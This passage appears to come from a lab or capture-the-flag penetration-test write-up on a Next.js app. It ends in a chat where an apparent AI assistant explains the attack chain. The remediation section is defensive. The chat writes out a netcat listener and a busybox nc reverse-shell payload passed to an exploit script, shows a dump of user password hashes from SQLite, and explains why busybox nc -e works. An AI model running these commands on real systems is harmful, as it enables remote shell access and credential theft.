3. **Credentials in flat-file/embedded databases.** The SQLite database stored alongside the application code with MD5-hashed passwords is a common misconfiguration in Node.js web applications. MD5 is broken and should never be used for password hashing.

4. **Node.js `--inspect` on production systems is dangerous.** Even when bound to `127.0.0.1`, any local user (or attacker with SSRF/shell access) can connect to the CDP endpoint and execute arbitrary code with the privileges of the Node.js process. This is a privilege escalation path that is often overlooked.

5. **SSH port forwarding is a versatile pivoting tool.** When a service is bound to loopback, SSH local port forwarding (`-L`) is a clean way to expose it to your attack machine without writing files to the target or needing additional tools installed.

6. **Base64 encoding for command injection.** When shell commands contain single quotes or special characters that conflict with the injection context, encoding the command as base64 and decoding it at runtime (`Buffer.from(b64, 'base64').toString()`) is a reliable bypass technique.

---

## Remediation Recommendations

### 1. Update Next.js / React to Patched Version
The React Flight deserialization vulnerability should be addressed by upgrading to a Next.js version that patches the prototype pollution issue in the `react-server-dom-webpack` decoder.

**Action:** Update Next.js and React Server Components to the latest patched versions. Monitor CVE databases for Next.js security advisories.

### 2. Use Strong Password Hashing
MD5 is a fast hashing algorithm designed for data integrity, not password storage. It is trivially crackable even with modest hardware.

**Action:** Replace MD5 with bcrypt (cost factor ≥ 12), Argon2id, or scrypt for all stored passwords.

### 3. Disable Node.js Debugger in Production
Running a Node.js process with `--inspect` in a production environment is a critical security misconfiguration, especially when running as root.

**Action:** Remove `--inspect=127.0.0.1:9229` from the uptime monitor service startup command. If remote debugging is required for diagnostics, implement strong authentication and restrict access to trusted admin IPs via firewall rules.

### 4. Run Services with Least Privilege
The uptime monitor process (`/opt/uptime-monitor/worker.js`) runs as root but only needs to make HTTP requests and write to a log file.

**Action:** Create a dedicated service account (e.g., `uptime-monitor`) with only the necessary file permissions. Update the systemd service unit to use `User=uptime-monitor`.

### 5. Restrict File Permissions on Application Directory
The SQLite database `/opt/reactor-app/reactor.db` should not be readable by the service user running the web application if it contains sensitive credentials.

**Action:** Separate credential storage from the application directory. Use environment variables or a secrets manager for sensitive configuration. Ensure database files are readable only by the processes that require them.

### 6. Implement Security Headers
The application lacks security headers like `Content-Security-Policy` and `X-Frame-Options`.

**Action:** Configure appropriate security headers in the Next.js configuration (`next.config.js`) or via a reverse proxy.





❯ can't we use a shell for this instead of the script?

Yes, if you have a reverse shell you can just use the sqlite3 CLI directly:

1. Set up your listener:
nc -lvnp 4444

2. Trigger the reverse shell via the exploit:
python3 poc.py "busybox nc <YOUR_IP> 4444 -e /bin/sh"

3. Once the shell connects, query the DB:
sqlite3 /opt/reactor-app/reactor.db
SELECT username, password_hash FROM users;
admin|a203b22191d744a4e70ada5c101b17b8
engineer|39d97110eafe2a9a68639812cd271e8e

That's much cleaner than the one-liner through the script. The script approach was just the agent working around not having an interactive shell — but if you pop a reverse shell first, everything becomes more natural and readable.

The flow then becomes:
1. Reverse shell as node
2. Query the DB manually
3. Crack the hash → reactor1
4. SSH as engineer
5. Escalate via the Node debugger

✻ Crunched for 7s

❯ what's busybox?

BusyBox is a single binary that bundles many standard Unix utilities (ls, nc, sh, wget, etc.) into one lightweight executable.

It's often found on minimal Linux systems (embedded devices, containers, stripped-down servers) where full versions of those tools aren't installed.

Why it matters in pentesting:

The target might not have a standard nc (netcat) with the -e flag (which attaches a shell to the connection). Different nc versions have different features:

┌────────────────────┬──────────────┐
│       Binary       │ Has -e flag? │
├────────────────────┼──────────────┤
│ netcat-traditional │ Yes          │
├────────────────────┼──────────────┤
│ netcat-openbsd     │ No           │
├────────────────────┼──────────────┤
│ busybox nc         │ Yes          │
└────────────────────┴──────────────┘

So when you don't know which nc is on the target, busybox nc is a reliable fallback because it almost always supports -e /bin/sh.

In the exploit command:
busybox nc <YOUR_IP> 4444 -e /bin/sh
- busybox nc — use busybox's built-in netcat
- <YOUR_IP> 4444 — connect back to your listener
- -e /bin/sh — attach a shell to that connection

If the target has a full nc with -e support you could just use nc directly. busybox is just the safer assumption when you're going in blind.